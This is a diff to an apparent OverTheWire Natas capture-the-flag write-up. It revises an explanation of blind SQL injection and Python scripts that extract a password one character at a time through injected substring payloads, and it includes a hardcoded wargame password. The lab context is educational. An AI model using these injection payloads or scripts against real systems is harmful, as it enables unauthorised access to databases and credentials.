@@ -290,13 +290,15 @@ That **{or "1" = "1"}** part makes the statement true whatever the username and 
 
 Here, it created a table that contains two columns : **username** and **password**. It asks us for the username as an input and checks if it exists in the table and tells us the result. If we blindly type **natas16**, it will state that it exists which is normal since we are seekings its password.
 
-In this level, we can get any hardcoded information. All we can get is a yes or no answer depending on the correctness of our input.
+In this level, we can't get any hardcoded information. All we can get is a yes or no answer depending on the correctness of our input.
 
 Since it is not sanitizing our input, we can just check for certain characters in the username instead of the whole word like checking if the first letter is **"n"**.
 
 To do so, we can write **{" or substring(username, 1, 1) = 'n' -- }** in the input field and normally it will ouputs a positive response. Don't forget to add space after -- (which stand for commenting everything that follows it) otherwise it won't work.
 
 We can do the same process on **password** column by comparing every letter with all the possible matches and collect the ones that gave positive response. This way, we can craft the password. This approach is called **Blind Injection**.
+
+We will be hunting the corresponding password for the username **natas16** already found by the key word **"and"**.
 
 Let's create a python script to auatomate the job.
 
@@ -325,12 +327,12 @@ for count in range(1, password_length + 1):
     # Test each character in the charset
     for char in charset:
         # Craft the SQL injection payload
-        # Format: " or binary substring(password,1,count)="password + char" --
+        # Format: natas16" and binary substring(password,1,count)="password + char" --
         # - binary ensures case-sensitive comparison
         # - substring(password,1,count) extracts password from 1 to count
         # - Compares with current password + guessed character
-        # - -- comments out the rest of the query
-        payload = f'" or binary substring(password,1,{count})="{password}{char}" -- '
+        # - # comments out the rest of the query
+        payload = f'natas16" and binary substring(password,1,{count})="{password}{char}" # '
         # Create data dictionary for POST request with username parameter as mentioned in source code
         data = {"username": payload}
         # Send POST request with the payload
@@ -383,7 +385,6 @@ Now, let's build a script to automate the search.
 
 ```python
 import requests
-from requests.auth import HTTPBasicAuth
 import string
 
 charset = string.ascii_letters + string.digits
@@ -391,7 +392,7 @@ password_length = 32
 password = ""
 
 session = requests.Session()
-session.auth = HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
+session.auth = ("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
 
 for count in range(1, password_length + 1):
 	found = False
@@ -415,3 +416,5 @@ print(f'Final password : {password}')
 After executing the code and waiting for a while, we get our password.
 
 ![alt text](NatasScreenshots/17.png)
+
+# Level 18
